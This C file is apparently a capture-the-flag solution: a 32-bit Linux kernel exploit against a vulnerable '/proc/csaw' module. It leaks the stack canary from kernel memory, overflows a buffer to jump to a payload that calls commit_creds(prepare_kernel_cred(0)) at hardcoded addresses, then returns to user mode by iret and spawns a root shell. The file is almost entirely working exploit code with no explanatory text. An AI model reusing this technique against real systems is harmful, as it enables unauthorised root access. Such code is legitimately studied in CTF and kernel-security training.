#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame {
    void * eip ; // instruction pointer
    uint32_t cs ; // code segment
    uint32_t eflags ; // CPU flags
    void * esp ; // stack pointer
    uint32_t ss ; // stack segment
} __attribute__((packed));

struct trap_frame tf;

void launch_shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void prepare_tf(void) {
    asm("pushl %cs; popl tf+4;"
        "pushfl; popl tf+8;"
        "pushl %esp; popl tf+12;"
        "pushl %ss; popl tf+16;");
    tf.eip = &launch_shell ;
    tf.esp -= 1024; // unused part of stack
}

// Kernel functions take args in registers
#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *) KERNCALL = (void*)0xc1069a40;
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xc1069be0;

void payload(void) {
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
        "iret ;");
}

void hexdump(char *buf)
{
    int i, j;
    for (i = 0; i < 4; i++)
    {
        for (j = 0; j < 16; j++)
        {
            printf("%02x ", buf[i*16+j] & 0xff);
        }
        printf(" | ");
        for (j = 0; j < 16; j++){
            printf("%c", buf[i*16+j] & 0xff);
        }
        printf("\n");
    }
}

int main()
{
    char canary[4];
    char buf[0x54];
    char buf1[0x40];

    int fd = open("/proc/csaw", O_RDWR);
    if (fd < 0) {
        printf("[-] failed to open /proc/csaw\n");
        exit(1);
    }

    lseek(fd, 0x10, SEEK_CUR);
    read(fd, buf1, sizeof(buf1));

    printf("dumping memory...\n\n");
    hexdump(buf1);

    memcpy(canary, buf1+0x20, 4);

    printf("%lx", (long)((void *) canary));

    memset(buf, 0x41, 0x40);
    memcpy(buf+0x40, canary, 4);
    memset(buf+0x44, 0x41, 0xc);
    *((void**) (buf+0x50)) = &payload;
    prepare_tf();

    write(fd, buf, sizeof(buf));

    return 0;
}
